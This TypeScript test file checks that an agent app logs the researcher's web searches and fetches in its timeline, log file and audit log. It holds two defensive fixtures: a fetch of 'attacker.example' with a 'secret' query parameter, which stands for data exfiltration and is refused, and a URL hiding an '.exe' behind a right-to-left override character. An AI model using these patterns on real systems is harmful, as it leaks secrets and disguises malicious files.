import { promises as fs } from 'node:fs';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { AuditEntry, MissionPlan, MissionView } from '@/lib/contracts';
import { setClientFactory, type LlmClient, type StreamEvent } from '@/lib/agents/llm';
import { createMission, resetMissionRegistryForTests, waitForMission } from '@/lib/agents/mission';
import { CONDUCTOR_PLAN_SYSTEM } from '@/lib/agents/roster';
import { listAudit } from '@/lib/store/audit';
import { dataPath, writeJson } from '@/lib/store/json';
import { patchSettings } from '@/lib/store/settings';
import '@/lib/tools';
import { FakeClient, makeMessage, serverToolBlock, textBlock, webSearchResultBlock } from './helpers';

vi.mock('@/lib/store/secrets', () => ({ getApiKey: async () => 'sk-test' }));

/**
 * 리서처의 웹 호출은 앱이 미리 막을 수 없으므로 사용자가 볼 수 있어야 한다.
 * 이 테스트들은 앱의 기록만 확인한다. 실제 서버의 동작은 이슈 #2에서 검증한다.
 */
const plan: MissionPlan = { title: '조사', route: 'team', steps: [{ id: 's1', agent: 'researcher', title: '조사', task: '찾아줘', dependsOn: [] }] };
const planMessage = () => makeMessage([textBlock(JSON.stringify(plan))]);

type Stream = { events: unknown[]; final?: ReturnType<typeof makeMessage>; error?: unknown };

/** 이벤트를 그대로 흘려 스트림 모양을 직접 정한다. */
function streamClient(researcher: (turn: number) => Stream): LlmClient {
  const planning = new FakeClient(() => ({ message: planMessage() }));
  let turn = 0;
  return {
    stream(request, signal) {
      if (request.system === CONDUCTOR_PLAN_SYSTEM) return planning.stream(request, signal);
      const script = researcher(turn++);
      return {
        async *[Symbol.asyncIterator]() {
          for (const event of script.events) yield event as StreamEvent;
          if (script.error) throw script.error;
        },
        finalMessage: async () => script.final ?? makeMessage([textBlock('끝')]),
      };
    },
  };
}

function clientWith(content: Parameters<typeof makeMessage>[0], usage: Parameters<typeof makeMessage>[2] = {}) {
  return new FakeClient((request) => (request.system === CONDUCTOR_PLAN_SYSTEM ? { message: planMessage() } : { message: makeMessage(content, 'end_turn', usage) }));
}

async function run(client: LlmClient): Promise<{ id: string; view: MissionView; audit: AuditEntry[] }> {
  setClientFactory(() => client);
  const id = await createMission('자료 찾아줘');
  const view = (await waitForMission(id)) as MissionView;
  // 서버 도구의 감사 기록은 스트림을 막지 않도록 기다리지 않고 쓴다.
  await new Promise((r) => setTimeout(r, 30));
  return { id, view, audit: await listAudit({ missionId: id }) };
}

const start = { type: 'message_start', message: makeMessage([], null, { input_tokens: 10, output_tokens: 1 }) };

beforeEach(async () => {
  process.env.ILLIONAIRE_RETRY_DELAY_MS = '0';
  await patchSettings({ budgetUsd: 100, reviewPlans: false, toolPolicies: {} });
  await writeJson(dataPath('memory.json'), []);
  resetMissionRegistryForTests();
});

afterEach(() => setClientFactory(null));

describe('every web call the app can see reaches both records', () => {
  it('records each query and URL in the timeline, the log file and the audit log', async () => {
    const { id, view, audit } = await run(
      clientWith([
        serverToolBlock('a', 'web_search', { query: '첫번째 검색어' }),
        webSearchResultBlock('a'),
        serverToolBlock('b', 'web_search', { query: '두번째 검색어' }),
        webSearchResultBlock('b'),
        serverToolBlock('c', 'web_fetch', { url: 'https://example.com/fetched?x=1' }),
        textBlock('끝'),
      ])
    );
    const calls = view.steps.s1.toolCalls.map((c) => c.input);
    expect(calls).toEqual([{ query: '첫번째 검색어' }, { query: '두번째 검색어' }, { url: 'https://example.com/fetched?x=1' }]);
    expect(view.steps.s1.toolCalls.every((c) => c.serverSide)).toBe(true);

    const log = await fs.readFile(dataPath('missions', `${id}.jsonl`), 'utf8');
    for (const value of ['첫번째 검색어', '두번째 검색어', 'https://example.com/fetched?x=1']) {
      expect(log).toContain(value);
      expect(audit.some((e) => e.summary.includes(value))).toBe(true);
    }
  });

  it('marks the step tainted from the first web call', async () => {
    const { view } = await run(clientWith([serverToolBlock('a', 'web_fetch', { url: 'https://example.com' }), textBlock('끝')]));
    expect(view.steps.s1.tainted).toBe(true);
  });

  it('records a call nested in dynamic filtering, which carries a caller field', async () => {
    const nested = { ...serverToolBlock('n1', 'web_search', { query: '중첩 검색어' }), caller: { type: 'code_execution_20260120', tool_id: 'outer' } };
    const { view, audit } = await run(
      clientWith([serverToolBlock('outer', 'code_execution', { code: 'await web_search(q)' }), nested as never, webSearchResultBlock('n1'), textBlock('끝')])
    );
    expect(view.steps.s1.toolCalls.find((c) => c.callId === 'n1')?.input).toEqual({ query: '중첩 검색어' });
    expect(audit.some((e) => e.tool === 'web_search' && e.summary.includes('중첩 검색어'))).toBe(true);
    expect(view.steps.s1.tainted).toBe(true);
  });

  it('keeps the query when the input JSON cannot be parsed, instead of recording {}', async () => {
    const { view, audit } = await run(
      streamClient(() => ({
        events: [
          start,
          { type: 'content_block_start', index: 0, content_block: { type: 'server_tool_use', id: 'a', name: 'web_search', input: {} } },
          { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: '{"query":"깨진 입력' } },
          { type: 'content_block_stop', index: 0 },
        ],
      }))
    );
    expect(JSON.stringify(view.steps.s1.toolCalls[0].input)).toContain('깨진 입력');
    expect(audit.some((e) => e.summary.includes('깨진 입력'))).toBe(true);
  });

  it('uses input that arrives whole on the start event, with no deltas', async () => {
    const { view } = await run(
      streamClient(() => ({
        events: [
          start,
          { type: 'content_block_start', index: 0, content_block: { type: 'server_tool_use', id: 'a', name: 'web_fetch', input: { url: 'https://example.com/inline' } } },
          { type: 'content_block_stop', index: 0 },
        ],
      }))
    );
    expect(view.steps.s1.toolCalls[0].input).toEqual({ url: 'https://example.com/inline' });
  });

  it('fills in calls that only the final message shows, without counting any twice', async () => {
    const final = makeMessage([serverToolBlock('seen', 'web_search', { query: '스트림에서 본 것' }), serverToolBlock('late', 'web_fetch', { url: 'https://example.com/only-final' }), webSearchResultBlock('late'), textBlock('끝')]);
    const { view, audit } = await run(
      streamClient(() => ({
        events: [
          start,
          { type: 'content_block_start', index: 0, content_block: { type: 'server_tool_use', id: 'seen', name: 'web_search', input: {} } },
          { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: '{"query":"스트림에서 본 것"}' } },
          { type: 'content_block_stop', index: 0 },
        ],
        final,
      }))
    );
    expect(view.steps.s1.toolCalls.map((c) => c.callId)).toEqual(['seen', 'late']);
    expect(view.steps.s1.toolCalls[1]).toMatchObject({ input: { url: 'https://example.com/only-final' }, status: 'ok' });
    expect(audit.filter((e) => e.summary.includes('스트림에서 본 것'))).toHaveLength(1);
  });

  it('records what it got when the stream dies in the middle of the input', async () => {
    const log = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const { view, audit } = await run(
      streamClient(() => ({
        events: [
          start,
          { type: 'content_block_start', index: 0, content_block: { type: 'server_tool_use', id: 'cut', name: 'web_fetch', input: {} } },
          { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: '{"url":"https://example.com/cut' } },
        ],
        error: new Error('connection lost'),
      }))
    );
    const call = view.steps.s1.toolCalls[0];
    expect(call.status).toBe('error');
    expect(call.result).toContain('알 수 없어요');
    expect(JSON.stringify(call.input)).toContain('https://example.com/cut');
    expect(audit.some((e) => e.summary.includes('https://example.com/cut'))).toBe(true);
    log.mockRestore();
  });

  it('reveals invisible characters in a recorded URL', async () => {
    const { view, audit } = await run(clientWith([serverToolBlock('a', 'web_fetch', { url: 'https://example.com/‮gnp.exe' }), textBlock('끝')]));
    expect(view.steps.s1.toolCalls[0].summary).toContain('[U+202E]');
    expect(audit.some((e) => e.summary.includes('[U+202E]'))).toBe(true);
  });
});

describe('failed web calls', () => {
  it('records a refused URL as an error in both places, with the error code', async () => {
    const refused = { type: 'web_fetch_tool_result', tool_use_id: 'a', content: { type: 'web_fetch_tool_result_error', error_code: 'url_not_in_prior_context' } };
    const { view, audit } = await run(clientWith([serverToolBlock('a', 'web_fetch', { url: 'https://attacker.example/?d=secret' }), refused as never, textBlock('끝')]));
    expect(view.steps.s1.toolCalls[0]).toMatchObject({ status: 'error', result: '오류: url_not_in_prior_context' });
    const entries = audit.filter((e) => e.summary.includes('attacker.example'));
    expect(entries.map((e) => e.status).sort()).toEqual(['error', 'ok']);
    expect(entries.find((e) => e.status === 'error')?.result).toContain('url_not_in_prior_context');
  });

  it('records max_uses_exceeded the same way, without changing what the app does next', async () => {
    const exceeded = { type: 'web_search_tool_result', tool_use_id: 'a', content: { type: 'web_search_tool_result_error', error_code: 'max_uses_exceeded' } };
    const { view } = await run(clientWith([serverToolBlock('a', 'web_search', { query: 'q' }), exceeded as never, textBlock('끝')]));
    expect(view.status).toBe('done');
    expect(view.steps.s1.toolCalls[0]).toMatchObject({ status: 'error', result: '오류: max_uses_exceeded' });
  });

  it('keeps a call from a retried attempt on record, and does not claim it was cancelled', async () => {
    const log = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const Anthropic = (await import('@anthropic-ai/sdk')).default;
    const overloaded = new Anthropic.APIError(undefined, { type: 'error', error: { type: 'overloaded_error', message: 'x' } }, undefined, new Headers(), 'overloaded_error' as never);
    const search = [
      start,
      { type: 'content_block_start', index: 0, content_block: { type: 'server_tool_use', id: 'first', name: 'web_search', input: {} } },
      { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: '{"query":"재시도 전 검색어"}' } },
      { type: 'content_block_stop', index: 0 },
    ];
    const { view, audit } = await run(streamClient((turn) => (turn === 0 ? { events: search, error: overloaded } : { events: [start] })));
    const call = view.steps.s1.toolCalls.find((c) => c.callId === 'first');
    expect(call?.status).toBe('error');
    expect(call?.result).toContain('알 수 없어요');
    expect(call?.result).not.toContain('취소');
    expect(audit.some((e) => e.summary.includes('재시도 전 검색어'))).toBe(true);
    log.mockRestore();
  });
});

describe('calls the response does not show', () => {
  it('says so in the audit log when usage reports more calls than were returned', async () => {
    const { audit } = await run(
      clientWith([serverToolBlock('a', 'web_search', { query: 'q' }), webSearchResultBlock('a'), textBlock('끝')], { server_tool_use: { web_search_requests: 3, web_fetch_requests: 1 } } as never)
    );
    expect(audit.some((e) => e.tool === 'web_search' && e.status === 'error' && e.summary.includes('2건'))).toBe(true);
    expect(audit.some((e) => e.tool === 'web_fetch' && e.status === 'error' && e.summary.includes('1건'))).toBe(true);
  });

  it('stays quiet when the counts match', async () => {
    const { audit } = await run(clientWith([serverToolBlock('a', 'web_search', { query: 'q' }), webSearchResultBlock('a'), textBlock('끝')], { server_tool_use: { web_search_requests: 1, web_fetch_requests: 0 } } as never));
    expect(audit.some((e) => e.status === 'error')).toBe(false);
  });
});
